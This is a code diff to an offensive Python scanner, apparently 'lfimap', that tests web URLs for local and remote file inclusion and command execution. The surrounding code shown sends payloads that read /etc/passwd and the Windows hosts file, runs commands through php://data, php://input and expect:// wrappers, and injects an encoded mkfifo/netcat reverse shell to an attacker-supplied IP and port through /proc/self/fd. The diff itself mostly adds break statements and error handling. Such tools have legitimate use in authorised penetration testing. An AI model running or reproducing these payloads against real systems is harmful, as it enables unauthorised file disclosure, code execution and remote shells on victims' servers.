@@ -21,11 +21,11 @@ class MyHandler(SimpleHTTPRequestHandler):
     def do_GET(self):
         if(self.path =='/'):
             self.path = 'index.html'
-            self.wfile.write(bytes("<p>961bb08a95dbc34397248d92352da799</p>", "utf-8"))
+            self.wfile.write(bytes("<p>961bb08a95dbc34397248d92352da799</p></br>961bb08a95dbc34397248d92352da799", "utf-8"))
 
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
-        
+            self.end_headers()
         else: return SimpleHTTPRequestHandler.do_GET(self)
 
 
@@ -143,7 +143,8 @@ def test_php_filter(url):
             tempUrl = u.replace('/etc/passwd', 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'LINUX')
             print("[+] LFI -> " + u)
-    
+            break
+
     #Windows
     for i in range(len(testW)):
         u = url.replace("DESTROY", testW[i])
@@ -158,7 +159,7 @@ def test_php_filter(url):
             tempUrl = u.replace("C:/Windows/System32/drivers/etc/hosts", 'TMP')
             getExploit(res, 'GET', 'LFI', tempUrl, '', headers, 'FILTER', 'WINDOWS')
             print("[+] LFI -> " + u)
-
+            break
 
 def test_php_data(url):
     if(args.verbose):
@@ -183,7 +184,8 @@ def test_php_data(url):
             tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'LINUX')
             print("[+] RCE -> " + u)
-    
+            break
+
     #Windows
     for i in range(len(testW)):
         if("DESTROY" in url):
@@ -198,7 +200,8 @@ def test_php_data(url):
             tempUrl = u.replace('ipconfig', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, '', headers, 'DATA', 'WINDOWS')
             print("[+] RCE -> " + u)
-    
+            break
+
     if(args.revshell):
         exploit(exploits, 'DATA')
 
@@ -231,26 +234,31 @@ def test_php_input(url):
             
             if(checkPayload(res)):
                 print("[+] RCE -> " + u + " -> HTTP POST: " + posts[j])
+                os = 'LINUX'
                 tempUrl = u.replace('cat%20/etc/passwd', 'TMP')
-                getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', 'LINUX')
-    
-    #Windows
-    for k in range(len(testW)):
-        if("DESTROY" in url):
-            u = url.replace("DESTROY", testW[k])
-        
-        for l in range(len(posts)):
-            try:
-                res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
-            except:
-                print("Proxy problem... Exiting.")
-                sys.exit(-1)
+                getExploit(res, 'POST', 'RCE', tempUrl, posts[j], headers, 'INPUT', os)
+                break
 
-            if(checkPayload(res)):
-                tempUrl = u.replace('ipconfig', 'TMP')
-                getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
-                print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
-    
+    if(os is not 'LINUX'):
+        print(os)
+        #Windows
+        for k in range(len(testW)):
+            if("DESTROY" in url):
+                u = url.replace("DESTROY", testW[k])
+        
+            for l in range(len(posts)):
+                try:
+                    res = requests.post(u, headers = headers, data = posts[l], proxies = proxies)
+                except:
+                    print("Proxy problem... Exiting.")
+                    sys.exit(-1)
+
+                if(checkPayload(res)):
+                    tempUrl = u.replace('ipconfig', 'TMP')
+                    getExploit(res, 'POST', 'RCE', tempUrl, posts[l], headers, 'INPUT', 'WINDOWS')
+                    print("[+] RCE -> " + u + " -> HTTP POST: " + posts[l])
+                    break
+
     if(args.revshell):
         exploit(exploits, 'INPUT')
 
@@ -280,6 +288,7 @@ def test_php_expect(url):
             tempUrl = u.replace('cat%20%2Fetc%2Fpasswd', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, testL[i], headers, 'EXPECT', 'LINUX')
             print("[+] RCE -> " + u)
+            break
 
     #Windows
     for j in range(len(testW)):
@@ -296,7 +305,8 @@ def test_php_expect(url):
             tempUrl = u.replace('ipconfig', 'TMP')
             getExploit(res, 'GET', 'RCE', tempUrl, testW[j], headers, 'EXPECT', 'WINDOWS')
             print("[+] RCE -> " + u)
-    
+            break
+
     if(args.revshell):
         exploit(exploits, 'EXPECT')
 
@@ -307,8 +317,13 @@ def test_rfi(url):
     
     #Local RFI test
     if(args.lhost):
-        server = HTTPServer((args.lhost, 75), MyHandler)
-        threading.Thread(target = server.serve_forever).start()
+        try:
+            server = HTTPServer((args.lhost, 75), MyHandler)
+            threading.Thread(target = server.serve_forever).start()
+        except KeyboardInterrupt:
+            print("Keyboard interrupt, stopping web server")
+        except:
+            print("Error while setting up local web server for RFI test: make sure lfimap is run as root")
 
         if('DESTROY' in url):
             pyld = "http%3a//"+args.lhost+":75/"
@@ -319,7 +334,7 @@ def test_rfi(url):
                     tempUrl = u.replace(pyld, 'TMP')
                     getExploit(res, 'GET', 'RFI', tempUrl, '', headers, 'RFI', 'UNKN')
                     print("[+] RFI -> " + u)
-                    return
+                    
             except:
                 pass
     
@@ -508,7 +523,6 @@ def exploit(exploits, method):
                
                 for i in range(15):
                     u = url.replace('TMP', "/proc/self/fd/{0}".format(i) + "?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+" +ip+'+'+str(port)+"+>/tmp/f")
-                    if(args.verbose): print(u)
                     requests.get(u, headers = tempHeaders, proxies = proxies)
         
         elif(exploit['ATTACK_METHOD'] == method and method == 'RFI'):
